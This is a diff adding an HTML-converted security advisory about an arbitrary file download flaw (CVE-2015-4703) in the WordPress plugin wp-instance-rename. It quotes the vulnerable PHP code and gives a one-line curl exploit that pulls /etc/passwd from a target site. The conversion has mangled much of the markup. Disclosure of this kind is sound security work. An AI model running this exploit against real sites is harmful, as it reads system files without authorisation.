@@ -1,0 +1,50 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title></title>
+<meta name="generator" content="HTML::TextToHTML v2.51"/>
+</head>
+<body>
+<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
+</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
+    white-space: -moz-pre-wrap; /</em> Firefox <em>/
+    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
+    white-space: -o-pre-wrap;   /</em> Opera 7 */
+    word-wrap: break-word;<br/>
+}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 127&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Arbitrary File download in wordpress plugin wp-instance-rename v1.0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-06-12&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/wp-instance-rename/">https://wordpress.org/plugins/wp-instance-rename/</a>"&gt;<a href="https://wordpress.org/plugins/wp-instance-rename/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/wp-instance-rename/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Vlajo&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-06-12&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;WordPress Rename plugin allows you to easily rename the complete WordPress installation. This plugin allows you to rename WordPress database, WordPress directory, change every necessary configuration file, easily from one page.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The code in mysqldump_download.php doesn&amp;#039;t check that the requested file is within the intended download directory:
+</p><p>try{
+</p><pre>
+        $dbname   = $_GET[&amp;quot;dbname&amp;quot;];
+        $dumpfname = $<u>GET[&amp;quot;dumpfname&amp;quot;];
+        $backup</u>folder = $<u>GET[&amp;quot;backup</u>folder&amp;quot;];      
+</pre>
+<p>}catch (Exception $e){}
+</p><p>if(empty($backup_folder)){
+</p><p>        $backup_folder=&amp;quot;backup/&amp;quot;;
+}<br/>
+echo &amp;quot;$dumpfname&amp;quot;;<br/>
+if (file_exists($dumpfname)) {          
+</p><pre>
+        // zip the dump file    
+        $name=$dbname . &amp;quot;<u>&amp;quot; . date(&amp;quot;Y-m-d&amp;quot;);        
+        $zipfname = $backup</u>folder.$name.&amp;quot;.zip&amp;quot;;
+        $zip = new ZipArchive();        
+        if($zip-&amp;gt;open($zipfname,ZIPARCHIVE::CREATE)) 
+        {
+           $zip-&amp;gt;addFile($dumpfname,$dumpfname);
+           $zip-&amp;gt;close();
+        }       
+        // read zip file and send it to standard output
+        if (file_exists($zipfname)) {
+                header(&amp;#039;Content-Description: File Transfer&amp;#039;);
+                header(&amp;#039;Content-Type: application/octet-stream&amp;#039;);
+                header(&amp;#039;Content-Disposition: attachment; filename=&amp;#039;.basename($zipfname));
+                flush();
+                readfile($zipfname);&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-4703&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=127"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;curl &lt;span style="color: #339933;"&gt;--&lt;/span&gt;data &lt;span style="color: #0000ff;"&gt;&amp;quot;dbname=wp&amp;amp;dumpfname=/etc/passwd&amp;amp;backup_folder=.&amp;quot;&lt;/span&gt;  http&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;//<a href="http://www.example.com/wp-instance-rename/mysqldump_download.php">www.example.com/wp-instance-rename/mysqldump_download.php</a> -o p.zip &lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisory.php?v=127">http://www.vapid.dhs.org/advisory.php?v=127</a>"&gt;<a href="http://www.vapid.dhs.org/advisory.php?v=127&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisory.php?v=127&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
+</pre>
+<p>&lt;/html&gt;
+</p>
+
+</body>
+</html>
